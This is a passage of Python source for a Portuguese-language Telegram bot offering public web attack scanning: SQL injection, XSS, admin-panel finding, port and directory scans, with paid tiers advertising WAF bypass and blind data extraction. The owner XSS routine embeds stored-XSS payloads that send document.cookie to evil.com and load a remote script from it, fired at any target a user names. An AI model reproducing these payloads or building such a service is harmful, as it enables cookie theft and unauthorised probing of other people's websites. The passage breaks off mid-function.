━━━━━━━━━━━━━━━━━━━━━━

<b>Desenvolvedores:</b>
@OnlyExaltarei
@Lhmodzz
@PETER_DNS

<b>Versão:</b> 5.1
<b>Plataforma:</b> Telegram Bot (Python)
<b>Ferramentas:</b> 55+ ferramentas avançadas com anti-false-positive
<b>Banco:</b> SQLite com índices, otimizações e cache inteligente
<b>Segurança:</b> Sistema de donos + VIP + rate limit custom

<b>Novidades V5.1:</b>
• /quick — Scan rápido em 1 segundo
• /scanall — Scan completo (6 scanners)
• /deep — Deep scan de vulnerabilidades
• /http — Análise HTTP response detalhada
• /sslchain — Cadeia de certificados SSL
• /batch — Scan múltiplos targets
• /watch — Monitorar mudanças de conteúdo
• /cancel — Cancelar scan ativo
• /report — Relatório completo em TXT
• WAF Detection no SQLi e XSS
• Banner grabbing no port scanner
• 100+ subdomínios + permutações
• DNSSEC, DKIM, DMARC, Reverse PTR
• Cache inteligente (10 min TTL)
• Inline buttons para rescan
• 30+ CMS detection

<b>Recursos V5.0:</b>
• 30+ payloads SQLi com WAF detection
• 18+ payloads XSS com WAF detection
• 100+ paths para Painel Admin Finder
• 50+ portas com banner grabbing
• 80+ diretórios expostos
• Filtros anti-false-positive
• Connection pooling + thread pool
• 11 scanners V5.0 (SSL, Headers, CORS, etc.)
• DNS-over-HTTPS
• Traceroute + Whois + GeoIP
• Security rating (0-100)
• Scheduled scans + Stealth mode
• Maintenance mode + VIP system
• Audit logs + Queue system

<i>Uso apenas para fins educacionais e de segurança autorizada.</i>"""
    send_msg(user_id, chat_id, msg)

def handle_info(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /info &lt;url&gt;\nExemplo: /info example.com")
        return
    target = args[0]
    log_command(user_id, username, "info", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Analisando</b> {escape_html(clean_target)}...")
    result = tool_website_info(target)
    send_msg(user_id, chat_id, result)

def handle_sqli(chat_id, user_id, username, first_name, last_name, args):
    """SQLi Scanner with tier selection for VIP/Owner"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /sqli &lt;url&gt; [verbose]\nExemplo: /sqli example.com/?id=1\nExemplo: /sqli example.com/?id=1 verbose")
        return
    target = args[0]
    verbose = len(args) > 1 and args[1].lower() == 'verbose'
    log_command(user_id, username, "sqli", target)
    clean_target = extract_hostname(target)

    # Tier detection: build inline buttons for VIP/Owner
    cb_target = target[:40]
    buttons = []
    if is_owner(user_id):
        buttons = [
            [{"text": "🟢 Normal", "callback_data": f"tier:sqli:normal:{cb_target}"[:64]}],
            [{"text": "⭐ VIP (3x payloads, WAF bypass)", "callback_data": f"tier:sqli:vip:{cb_target}"[:64]}],
            [{"text": "👑 OWNER (0-day, blind extraction)", "callback_data": f"tier:sqli:owner:{cb_target}"[:64]}],
        ]
        send_message_with_buttons(chat_id, f"🔍 <b>SQLi Scanner</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n👑 <b>Modo OWNER disponível!</b>\nSelecione o nível do scan:", buttons)
        return
    elif is_vip(user_id):
        buttons = [
            [{"text": "🟢 Normal", "callback_data": f"tier:sqli:normal:{cb_target}"[:64]}],
            [{"text": "⭐ VIP (3x payloads, WAF bypass)", "callback_data": f"tier:sqli:vip:{cb_target}"[:64]}],
        ]
        send_message_with_buttons(chat_id, f"🔍 <b>SQLi Scanner</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n⭐ <b>VIP detectado!</b>\nSelecione o nível do scan:", buttons)
        return

    # Normal user — no tier buttons, just run normal scan
    _run_sqli_normal(chat_id, user_id, target, verbose)


def _run_sqli_normal(chat_id, user_id, target, verbose=False):
    """Execute normal SQLi scan (for non-VIP users or when 'normal' is selected)"""
    clean_target = extract_hostname(target)
    cached = db_cache_get("sqli", target)
    if cached and not verbose:
        buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:sqli:{target}"[:64][:64]}]]
        send_message_with_buttons(chat_id, cached, buttons)
        return

    if verbose:
        send_msg(user_id, chat_id, f"🔍 <b>Scanner SQLi (VERBOSE)</b> em {escape_html(clean_target)}...\n📊 Modo detalhado ativado — mostrando cada payload testado.")
    else:
        send_msg(user_id, chat_id, f"🔍 <b>Scanner SQLi iniciado</b> em {escape_html(clean_target)}...")

    result = tool_sqli(target, verbose=verbose)
    db_cache_set("sqli", target, result)
    buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:sqli:{target}"[:64][:64]}]]
    send_message_with_buttons(chat_id, result, buttons)


def _run_sqli_vip(chat_id, user_id, target, verbose=False):
    """Execute VIP SQLi scan"""
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"⭐ <b>VIP SQLi Scanner</b> em {escape_html(clean_target)}...\n🔥 3x payloads, time-based deep, WAF bypass patterns, GraphQL injection.")
    result = tool_sqli_vip(target, verbose=verbose)
    buttons = [[{"text": "🔄 Rescan VIP", "callback_data": f"rescan:sqli_vip:{target}"[:64]}]]
    send_message_with_buttons(chat_id, result, buttons)


def _run_sqli_owner(chat_id, user_id, target, verbose=False):
    """Execute OWNER SQLi scan"""
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"👑 <b>OWNER SQLi Scanner</b> em {escape_html(clean_target)}...\n💀 WAF bypass total, 0-day patterns, blind extraction, multi-DB.")
    result = tool_sqli_owner(target)
    buttons = [[{"text": "🔄 Rescan OWNER", "callback_data": f"rescan:sqli_owner:{target}"[:64]}]]
    send_message_with_buttons(chat_id, result, buttons)


def handle_xss(chat_id, user_id, username, first_name, last_name, args):
    """XSS Scanner with tier selection for VIP/Owner"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /xss &lt;url&gt; [verbose]\nExemplo: /xss example.com/?q=\nExemplo: /xss example.com/?q= verbose")
        return
    target = args[0]
    verbose = len(args) > 1 and args[1].lower() == 'verbose'
    log_command(user_id, username, "xss", target)
    clean_target = extract_hostname(target)

    # Tier detection: build inline buttons for VIP/Owner
    cb_target = target[:40]
    buttons = []
    if is_owner(user_id):
        buttons = [
            [{"text": "🟢 Normal", "callback_data": f"tier:xss:normal:{cb_target}"[:64]}],
            [{"text": "⭐ VIP (DOM-based, CSP bypass)", "callback_data": f"tier:xss:vip:{cb_target}"[:64]}],
            [{"text": "👑 OWNER (VIP + stored XSS, polyglot)", "callback_data": f"tier:xss:owner:{cb_target}"[:64]}],
        ]
        send_message_with_buttons(chat_id, f"🔍 <b>XSS Scanner</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n👑 <b>Modo OWNER disponível!</b>\nSelecione o nível do scan:", buttons)
        return
    elif is_vip(user_id):
        buttons = [
            [{"text": "🟢 Normal", "callback_data": f"tier:xss:normal:{cb_target}"[:64]}],
            [{"text": "⭐ VIP (DOM-based, CSP bypass)", "callback_data": f"tier:xss:vip:{cb_target}"[:64]}],
        ]
        send_message_with_buttons(chat_id, f"🔍 <b>XSS Scanner</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n⭐ <b>VIP detectado!</b>\nSelecione o nível do scan:", buttons)
        return

    # Normal user — no tier buttons, just run normal scan
    _run_xss_normal(chat_id, user_id, target, verbose)


def _run_xss_normal(chat_id, user_id, target, verbose=False):
    """Execute normal XSS scan"""
    clean_target = extract_hostname(target)
    cached = db_cache_get("xss", target)
    if cached and not verbose:
        buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:xss:{target}"[:64][:64]}]]
        send_message_with_buttons(chat_id, cached, buttons)
        return

    if verbose:
        send_msg(user_id, chat_id, f"🔍 <b>Scanner XSS (VERBOSE)</b> em {escape_html(clean_target)}...\n📊 Modo detalhado ativado — mostrando cada payload testado.")
    else:
        send_msg(user_id, chat_id, f"🔍 <b>Scanner XSS iniciado</b> em {escape_html(clean_target)}...")

    result = tool_xss_scanner(target, verbose=verbose)
    db_cache_set("xss", target, result)
    buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:xss:{target}"[:64][:64]}]]
    send_message_with_buttons(chat_id, result, buttons)


def _run_xss_vip(chat_id, user_id, target, verbose=False):
    """Execute VIP XSS scan"""
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"⭐ <b>VIP XSS Scanner</b> em {escape_html(clean_target)}...\n🔥 DOM-based, polyglot multi-contexto, CSP bypass, event handlers.")
    result = tool_xss_vip(target, verbose=verbose)
    buttons = [[{"text": "🔄 Rescan VIP", "callback_data": f"rescan:xss_vip:{target}"[:64]}]]
    send_message_with_buttons(chat_id, result, buttons)


def _run_xss_owner(chat_id, user_id, target, verbose=False):
    """Execute OWNER XSS scan — VIP XSS + stored XSS deep scan"""
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"👑 <b>OWNER XSS Scanner</b> em {escape_html(clean_target)}...\n💀 VIP XSS + Stored XSS, polyglot payloads, deep CSP bypass.")
    # Owner XSS = VIP XSS + extra stored XSS payloads
    result_vip = tool_xss_vip(target, verbose=verbose)
    result_extra = f"\n\n━━━ OWNER STORED XSS DEEP SCAN ━━━\n"
    stored_payloads = [
        ("<script>document.getElementById('test')?.insertAdjacentHTML('beforeend','<img src=x onerror=fetch(`//evil.com/?c=${document.cookie}`)>')</script>", "Stored XSS + cookie exfil"),
        ("<svg/onload=setInterval(()=>{var s=document.createElement('script');s.src='//evil.com/x.js';document.body.appendChild(s)},1000)>", "Stored XSS + script injection"),
        ("<input onfocus=alert(document.cookie) autofocus>", "Stored XSS + autofocus"),
        ("<details open ontoggle=fetch('https://evil.com/'+document.cookie)>", "Stored XSS + details ontoggle"),
    ]
    url = target
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    for payload, desc in stored_payloads:
        try:
            from urllib.parse import quote
            test_url = f"{url}?q={quote(payload)}"
            resp = _safe_get(test_url, timeout=10)
            if resp and resp.status_code < 400 and payload.replace('(', '') in resp.text:
                result_extra += f"🔴 VULN: {desc} (payload refletido)\n"
            else:
                result_extra += f"⚪ Não vulnerável: {desc}\n"
        except:
            result_extra += f"❌ Erro testando: {desc}\n"
    result = result_vip + result_extra
    buttons = [[{"text": "🔄 Rescan OWNER", "callback_data": f"rescan:xss_owner:{target}"[:64]}]]
    send_message_with_buttons(chat_id, result, buttons)

def handle_admin_panel(chat_id, user_id, username, first_name, last_name, args):
    """/admin — Quick admin panel finder (progress + cache + buttons)"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /admin &lt;url&gt;\nExemplo: /admin example.com")
        return
    target = args[0]
    log_command(user_id, username, "admin_panel", target)
    clean_target = extract_hostname(target)

    # V5.1: Check DB cache first
    cached = db_cache_get("admin", target)
    if cached:
        buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:admin:{target}"[:64][:64]}]]
        send_message_with_buttons(chat_id, cached, buttons)
        return

    send_msg(user_id, chat_id, f"🔍 <b>Buscando painéis admin</b> em {escape_html(clean_target)}...")
    scan_id = f"admin_{user_id}_{time.time()}"
    progress_msg_id = send_progress(chat_id, scan_id, 0, 100, "Escaneando paths...")
    result = tool_admin_finder(target, chat_id, progress_msg_id)
    finish_progress(progress_msg_id, chat_id, result)
    db_cache_set("admin", target, result)
    buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:admin:{target}"[:64][:64]}]]
    send_message_with_buttons(chat_id, result, buttons)

def handle_ports(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /ports &lt;ip/domain&gt;\nExemplo: /ports example.com")
        return
    target = args[0]
    log_command(user_id, username, "ports", target)
    # FIX v3.9: Show clean hostname in progress message
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Scan de portas</b> em {escape_html(clean_target)}...")
    result = tool_port_scanner(target)
    send_msg(user_id, chat_id, result)

def handle_dirs(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /dirs &lt;url&gt;\nExemplo: /dirs example.com")
        return
    target = args[0]
    log_command(user_id, username, "dirs", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Scan de diretórios</b> em {escape_html(clean_target)}...")
    result = tool_directory_scanner(target)
    send_msg(user_id, chat_id, result)

def handle_sub(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /sub &lt;domain&gt;\nExemplo: /sub example.com")
        return
    target = args[0]
    log_command(user_id, username, "sub", target)
    # FIX v3.9: Show clean hostname in progress message
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Scan de subdomínios</b> em {escape_html(clean_target)}...")
    result = tool_subdomain_scanner(target)
    send_msg(user_id, chat_id, result)

def handle_wp(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /wp &lt;url&gt;\nExemplo: /wp example.com")
        return
    target = args[0]
    log_command(user_id, username, "wp", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>WordPress Scanner</b> em {escape_html(clean_target)}...")
    result = tool_wordpress_scanner(target)
    send_msg(user_id, chat_id, result)

def handle_emails(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /emails &lt;url&gt;\nExemplo: /emails example.com")
        return
    target = args[0]
    log_command(user_id, username, "emails", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Extraindo emails</b> de {escape_html(clean_target)}...")
    result = tool_email_scraper(target)
    send_msg(user_id, chat_id, result)

def handle_dns(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /dns &lt;domain&gt;\nExemplo: /dns example.com")
        return
    target = args[0]
    log_command(user_id, username, "dns", target)
    # FIX v3.9: Show clean hostname in progress message
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Análise DNS</b> de {escape_html(clean_target)}...")
    result = tool_dns_tools(target)
    send_msg(user_id, chat_id, result)

def handle_cms(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /cms &lt;url&gt;\nExemplo: /cms example.com")
        return
    target = args[0]
    log_command(user_id, username, "cms", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Detectando CMS</b> em {escape_html(clean_target)}...")
    result = tool_cms_detector(target)
    send_msg(user_id, chat_id, result)

def handle_reverse(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /reverse &lt;ip&gt;\nExemplo: /reverse 8.8.8.8")
        return
    target = args[0]
    log_command(user_id, username, "reverse", target)
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Reverse IP</b> de {escape_html(clean_target)}...")
    result = tool_reverse_ip(target)
    send_msg(user_id, chat_id, result)

def handle_ftpssh(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /ftpssh &lt;ip/domain&gt;\nExemplo: /ftpssh example.com")
        return
    target = args[0]
    log_command(user_id, username, "ftpssh", target)
    # FIX v3.9: Show clean hostname in progress message
    clean_target = extract_hostname(target)
    send_msg(user_id, chat_id, f"🔍 <b>Scan FTP/SSH</b> em {escape_html(clean_target)}...")
    result = tool_ftp_ssh(target)
    send_msg(user_id, chat_id, result)

def handle_ping(chat_id, user_id, username, first_name, last_name, args):
    """Ping command - show bot response time and status"""
    log_user(user_id, username, first_name, last_name)

    # FIX v3.7: Correctly separate bot latency from API latency
    bot_start = time.time()  # Start timer for total bot processing

    # API latency = time to reach Telegram servers
    api_start = time.time()
    resp = None
    api_latency = 0
    api_status = "Offline"
    try:
        resp = HTTP_SESSION.get(f"{API_URL}/getMe", timeout=5)
        api_latency = (time.time() - api_start) * 1000
        api_status = "Online" if resp and resp.status_code == 200 else "Error"
    except:
        api_latency = 0
        api_status = "Offline"

    # Bot latency = total time minus API time (the bot's own processing)
    total_time = (time.time() - bot_start) * 1000  # ms
    bot_latency = max(0, total_time - api_latency)  # Bot's own processing time
    uptime = time.time() - BOT_START_TIME
    days = int(uptime // 86400)
    hours = int((uptime % 86400) // 3600)
    minutes = int((uptime % 3600) // 60)
    secs = int(uptime % 60)

    # Check bot name
    try:
        bot_name = resp.json().get('result', {}).get('username', 'N/D') if resp and resp.status_code == 200 else 'N/D'
    except:
        bot_name = 'N/D'

    # Uptime string
    if days > 0:
        uptime_str = f"{days}d {hours}h {minutes}m {secs}s"
    elif hours > 0:
        uptime_str = f"{hours}h {minutes}m {secs}s"
    elif minutes > 0:
        uptime_str = f"{minutes}m {secs}s"
    else:
        uptime_str = f"{secs}s"

    # Connection speed indicator (based on API latency)
    if api_latency < 200:
        speed_icon = "⚡"
        speed_label = "Rápido"
    elif api_latency < 500:
        speed_icon = "🟢"
        speed_label = "Normal"
    elif api_latency < 1000:
        speed_icon = "🟡"
        speed_label = "Lento"
    else:
        speed_icon = "🔴"
        speed_label = "Muito lento"

    msg = f"""🏓 <b>Ping — MTH Security v5.2</b>
━━━━━━━━━━━━━━━━━━━━━━

📡 <b>Latência do Bot:</b> {bot_latency:.1f}ms
📡 <b>Latência da API Telegram:</b> {api_latency:.1f}ms
{speed_icon} <b>Status da Conexão:</b> {speed_label}

🤖 <b>Bot:</b> @{escape_html(bot_name)}
📊 <b>API Status:</b> {api_status}

⏱️ <b>Uptime:</b> {uptime_str}

👤 <b>Seu ID:</b> <code>{user_id}</code>
👤 <b>Username:</b> @{escape_html(username)}

━━━━━━━━━━━━━━━━━━━━━━
<i>Envio: {datetime.now().strftime('%H:%M:%S')}</i>"""

    send_msg(user_id, chat_id, msg)

# ═══════════════════════════════════════════════════════════════
#  OWNER-ONLY COMMANDS
# ═══════════════════════════════════════════════════════════════

def handle_logs(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Ver logs de usuários"""
    log_user(user_id, username, first_name, last_name)

    if not check_owner(user_id, chat_id):
        return

    log_owner_command(user_id, username, "logs")

    stats = get_user_stats()

    if args and len(args) > 0:
        arg = args[0]
        # Check for user: prefix
        if arg.startswith("user:"):
            uid_str = arg.split(":", 1)[1]
            if not uid_str.isdigit():
                send_msg(user_id, chat_id, "❌ Use: /logs user:&lt;id&gt;\nExemplo: /logs user:123456789")
                return
            user_logs = get_user_logs(int(uid_str))
            if not user_logs:
                send_msg(user_id, chat_id, f"📋 <b>Nenhum log encontrado para ID:</b> {uid_str}")
                return
            msg = f"📋 <b>Logs do Usuário ID: {uid_str}</b> ({len(user_logs)} comandos)\n━━━━━━━━━━━━━━━━━━━━━━\n"
            for l in user_logs[:15]:
                msg += f"📌 /{l['command']} → {l['target'] or 'N/A'}\n"
                msg += f"   @{l['username']} | {l['timestamp']}\n\n"
            send_long_message(chat_id, msg)
            return

        # Check for plain number
        if arg.isdigit():
            user_logs = get_user_logs(int(arg))
            if not user_logs:
                send_msg(user_id, chat_id, f"📋 <b>Nenhum log encontrado para ID:</b> {arg}")
                return
            msg = f"📋 <b>Logs do Usuário ID: {arg}</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
            for l in user_logs[:10]:
                msg += f"📌 /{l['command']} → {l['target'] or 'N/A'}\n"
                msg += f"   Data: {l['timestamp']}\n\n"
            send_long_message(chat_id, msg)
            return

        # FIX v3.7: Username search with LIKE wildcard escaping + context manager
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.row_factory = sqlite3.Row
                c = conn.cursor()
                escaped_arg = arg.replace('%', '\\%').replace('_', '\\_')
                c.execute("SELECT * FROM logs WHERE username LIKE ? ESCAPE '\\' ORDER BY id DESC LIMIT 15", (f"%{escaped_arg}%",))
                rows = [dict(r) for r in c.fetchall()]
        except Exception as e:
            rows = []
            print(f"[DB Error] logs username search: {e}")

        if rows:
            msg = f"📋 <b>Logs para @{escape_html(arg)}</b> ({len(rows)} comandos)\n━━━━━━━━━━━━━━━━━━━━━━\n"
            for l in rows:
                msg += f"📌 /{l['command']} → {l['target'] or 'N/A'}\n"
                msg += f"   ID:{l['user_id']} | {l['timestamp']}\n\n"
            send_long_message(chat_id, msg)
        else:
            send_msg(user_id, chat_id, f"📋 <b>Nenhum log encontrado para:</b> {arg}")
        return

    # Show global stats + recent logs
    logs = get_recent_logs(15)

    msg = f"📊 <b>Painel Administrativo — Logs</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"👥 <b>Total Usuários:</b> {stats['total']}\n"
    msg += f"👑 <b>Donos:</b> {stats['owners']}\n"
    msg += f"👤 <b>Regulares:</b> {stats['regular']}\n"
    msg += f"⚡ <b>Total Comandos:</b> {stats['commands']}\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📋 <b>Últimos 15 comandos:</b>\n\n"

    for l in logs:
        name = f"@{l['username']}" if l['username'] else str(l['user_id'])
        msg += f"📌 {name} → /{l['command']}\n"
        msg += f"   Target: {l['target'] or 'N/A'}\n"
        msg += f"   {l['timestamp']}\n\n"

    msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
    msg += "<i>Use /logs &lt;id&gt; para ver logs de um usuário\n"
    msg += "Use /logs user:&lt;id&gt; para ver comandos de um ID específico\n"
    msg += "Use /logs &lt;username&gt; para buscar por nome</i>"

    send_long_message(chat_id, msg)

def handle_panel(chat_id, user_id, username, first_name, last_name, args):
    """PUBLIC: Painel Admin Finder — encontrar painéis de administração de sites"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_msg(user_id, chat_id, "❌ Use: /panel &lt;url&gt;\nExemplo: /panel example.com")
        return
    target = args[0]
    log_command(user_id, username, "panel", target)
    clean_target = extract_hostname(target)

    # V5.1: Check DB cache first
    cached = db_cache_get("panel", target)
    if cached:
        buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:panel:{target}"[:64][:64]}]]
        send_message_with_buttons(chat_id, cached, buttons)
        return

    send_msg(user_id, chat_id, f"🔍 <b>Painel Admin Finder</b> em {escape_html(clean_target)}...\n📊 Scan completo com 100+ paths...")
    scan_id = f"panel_{user_id}_{time.time()}"
    # V5.1: Set stop event for cancellation
    STOP_EVENTS[user_id] = threading.Event()
    progress_msg_id = send_progress(chat_id, scan_id, 0, 100, "Escaneando paths...")
    result = tool_admin_finder(target, chat_id, progress_msg_id)
    finish_progress(progress_msg_id, chat_id, result)
    db_cache_set("panel", target, result)
    # Cleanup stop event
    if user_id in STOP_EVENTS:
        del STOP_EVENTS[user_id]
    buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:panel:{target}"[:64][:64]}]]
    send_message_with_buttons(chat_id, result, buttons)

def handle_botpanel(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Painel admin do bot (stats, donos, comandos)"""
    log_user(user_id, username, first_name, last_name)

    if not check_owner(user_id, chat_id):
        return

    log_owner_command(user_id, username, "botpanel")
    stats = get_user_stats()

    uptime = time.time() - BOT_START_TIME
    days = int(uptime // 86400)
    hours = int((uptime % 86400) // 3600)
    minutes = int((uptime % 3600) // 60)
    secs = int(uptime % 60)

    if days > 0:
        uptime_str = f"{days}d {hours}h {minutes}m {secs}s"
    elif hours > 0:
        uptime_str = f"{hours}h {minutes}m {secs}s"
    else:
        uptime_str = f"{minutes}m {secs}s"

    # Get DB size
    try:
        db_size = os.path.getsize(DB_PATH) / 1024
        db_size_str = f"{db_size:.1f} KB"
    except:
        db_size_str = "N/D"

    msg = f"""📊 <b>Painel do Bot — MTH Security v5.2</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>📈 Estatísticas:</b>
👥 Total de usuários: {stats['total']}
👑 Donos: {stats['owners']}
👤 Regulares: {stats['regular']}
⚡ Total de comandos: {stats['commands']}
⏱️ Uptime: {uptime_str}
💾 Banco: {db_size_str}

<b>👑 Donos/Desenvolvedores:</b>"""

    for uid, uname in OWNERS.items():
        msg += f"\n  → {uname} (ID: {uid})"

    msg += """

<b>📋 Comandos Restritos (Donos):</b>
/logs — Ver histórico de comandos
/botpanel — Este painel
/bancodds — Dump do banco de dados
/msg — Enviar mensagem pra todos os usuários
/stats — Estatísticas de usuários
/ban — Banir usuário
/unban — Desbanir usuário
/export — Exportar lista de usuários
/maintenance — Modo manutenção
/cooldown — Configurar rate limit
/vip add/remove — Gerenciar VIPs
/viplist — Listar todos os VIPs
/log — Audit logs detalhados
/clearlogs — Limpar logs antigos
/broadcast — Agendar broadcast
/top — Top sites mais escaneados

<b>🔧 Ferramentas (Todos):</b>
/info, /sqli, /xss, /admin, /panel,
/ports, /dirs, /sub, /wp, /emails,
/dns, /cms, /reverse, /ftpssh, /ping, /uptime

<b>🛡️ Scanners V5.0:</b>
/ssl — Auditoria SSL/TLS
/headers — Análise de Security Headers
/cors — Teste CORS misconfiguration
/robots — Análise robots.txt
/sitemap — Análise sitemap.xml
/tech — Detecção de tecnologias
/exposed — Arquivos sensíveis expostos
/backup — Backups expostos
/api — Descoberta de APIs
/shell — Hunt de webshells
/config — Configs expostas
/traceroute — Rastreamento de rota
/whois — Informações do domínio
/ip — GeoIP avançado
/rate — Nota de segurança geral
/compare — Comparar 2 sites
/history — Histórico de scans
/pdf — Exportar relatório
/schedule — Agendar scan
/stealth — Scan lento (anti-detect)
/notify — Notificar quando mudar

━━━━━━━━━━━━━━━━━━━━━━
<i>""" + datetime.now().strftime("%d/%m/%Y %H:%M") + """</i>"""

    send_msg(user_id, chat_id, msg)

def handle_bancodds(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Dump do banco de dados"""
    log_user(user_id, username, first_name, last_name)

    if not check_owner(user_id, chat_id):
        return

    log_owner_command(user_id, username, "bancodds")
    send_msg(user_id, chat_id, "⏳ <b>Gerando dump do banco de dados...</b>")

    dump = get_db_dump()

    # If too long, send as document
    if len(dump) > 3500:
        success = send_document(chat_id, dump, "mth_security_database_dump.txt")
        if success:
            send_msg(user_id, chat_id, "📄 <b>Dump do banco enviado como arquivo.</b>")
        else:
            send_msg(user_id, chat_id, "❌ <b>Falha ao enviar o dump do banco.</b> Tente novamente.")
            return
    else:
        # FIX v3.9: Escape HTML in inline dump to prevent XSS via username/target
        safe_dump = escape_html(dump)
        send_msg(user_id, chat_id, f"📊 <b>Banco de Dados</b>\n━━━━━━━━━━━━━━━━━━━━━━\n" + safe_dump)

# ═══════════════════════════════════════════════════════════════
#  GRACEFUL SHUTDOWN
# ═══════════════════════════════════════════════════════════════
def _broadcast_retry_send(api_method, payload, max_retries=2):
    """Send with retry + exponential backoff. Returns (success: bool, fatal: bool).
    fatal=True means the error is permanent (blocked, bot was blocked, etc.) and
    we should NOT retry or count it as a transient failure."""
    for attempt in range(max_retries + 1):
        try:
            resp = HTTP_SESSION.post(f"{API_URL}/{api_method}", json=payload, timeout=15)
            if resp and resp.status_code == 200:
                return True, False
            # Classify the error
            try:
                error_data = resp.json()
                error_desc = error_data.get('description', '').lower()
                error_code = error_data.get('error_code', 0)
            except Exception:
                error_desc = ''
                error_code = resp.status_code if resp else 0

            # Permanent errors — don't retry
            if error_code == 403:
                return False, True  # bot was blocked by user
            if 'bot was blocked by the user' in error_desc:
                return False, True
            if 'chat not found' in error_desc or 'chat_id not found' in error_desc:
                return False, True
            if 'user is deactivated' in error_desc:
                return False, True
            if 'bad request' in error_desc and 'chat_id' in error_desc:
                return False, True

            # Transient errors — retry
            if error_code == 429:
                retry_after = error_data.get('parameters', {}).get('retry_after', 5)
                time.sleep(min(retry_after, 30))
                continue
            if error_code == 500 or error_code >= 500:
                time.sleep(min(2 ** attempt, 10))
                continue
            if 'network' in error_desc or 'timeout' in error_desc:
                time.sleep(min(2 ** attempt, 10))
                continue

            # Unknown error — retry once
            if attempt < max_retries:
                time.sleep(min(2 ** attempt, 5))
                continue

            return False, False
        except Exception as e:
            # Network error — retry
            if attempt < max_retries:
                time.sleep(min(2 ** attempt, 5))
                continue
            return False, False
    return False, False


def _do_broadcast(media_type, file_id, broadcast_text, users, owner_chat_id, owner_user_id):
    """Execute a broadcast loop with a SINGLE edited progress message.
    Returns (sent, failed_trans, blocked)."""
    sent = 0
    failed = 0
    blocked = 0
    total = len(users)
    update_interval = max(10, total // 10)  # edit every ~10% or at least every 10
    # Send initial progress message and capture its ID for editing
    progress_text = f"📢 <b>Broadcast em andamento...</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📊 Progresso: 0/{total} (0%)\n✅ Enviados: 0 | ⚠️ Bloqueados: 0 | ❌ Falhas: 0"
    progress_msg_id = None
    try:
        resp = HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
            "chat_id": owner_chat_id,
            "text": progress_text,
            "parse_mode": "HTML"
        }, timeout=10)
        if resp and resp.status_code == 200:
            progress_msg_id = resp.json().get('result', {}).get('message_id')
    except:
        pass

    def _edit_progress(sent, failed, blocked, current, total):
        """Edit the single progress message with updated stats."""
        if progress_msg_id is None:
            return
        pct = (current / total * 100) if total else 0
        bar_len = 20
        filled = int(bar_len * current / total) if total else 0
        bar = '█' * filled + '░' * (bar_len - filled)
        new_text = (f"📢 <b>Broadcast em andamento...</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 [{bar}] {pct:.0f}%\n"
